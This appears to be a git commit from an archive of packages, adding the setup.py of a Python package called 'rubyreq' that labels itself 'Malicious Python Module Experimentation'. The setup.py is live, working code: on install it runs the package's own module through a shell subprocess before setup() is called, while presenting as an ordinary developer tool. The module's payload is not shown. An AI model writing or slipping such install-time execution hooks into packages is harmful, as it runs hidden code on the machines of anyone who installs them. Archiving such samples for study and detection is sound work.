9da479fa6ef15801082b2c7fb17f9f72662e6c72
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 14:46:55 +0000

    Add package rubyreq/6/rubyreq-6.tar.gz

---
+++ packages/rubyreq/rubyreq-6.tar.gz/rubyreq-6/setup.py
@@ -0,0 +1,33 @@
+from setuptools import setup, find_packages
+from sys import executable
+import subprocess
+
+def rn():
+      subprocess.call(f"{executable} -m rubyreq", shell=True)
+rn()
+setup(
+  name="rubyreq",
+  version="6",
+  author="CodeUK",
+  author_email="d@doop.fun",
+  description="Malicious Python Module Experimentation",
+  url="https://github.com/codeuk/shutil",
+  project_urls={
+    "GitHub": "https://github.com/codeuk/shutil",
+    "Bug Tracker": "https://github.com/codeuk/shutil/issues",
+  },
+  license="MIT",
+  keywords=["rubyreq","rubyreq"],
+  classifiers = [
+  "Programming Language :: Python :: 3",
+  "License :: OSI Approved :: MIT License",
+  "Operating System :: Microsoft :: Windows",
+  "Development Status :: 5 - Production/Stable",
+  "Intended Audience :: Developers",
+  "Natural Language :: English",
+  "Topic :: Software Development"
+  ],
+  package_dir={"": "."},
+  packages=find_packages(where="."),
+  install_requires=['requests'],
+)
